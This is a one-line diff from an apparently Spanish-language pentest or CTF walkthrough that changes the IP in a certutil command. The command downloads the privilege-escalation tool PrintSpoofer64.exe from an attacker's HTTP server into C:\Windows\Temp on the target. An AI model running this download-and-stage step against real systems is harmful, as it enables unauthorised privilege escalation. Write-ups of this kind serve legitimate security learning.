@@ -37,7 +37,7 @@ python3 -m http.server 8080
 Descargamos el archivo con el siguiente comando: 
 
 ```
-certutil -urlcache -split -f http://192.168.176.220:8080/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
+certutil -urlcache -split -f http://192.168.179.220:8080/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
 
 ```
 
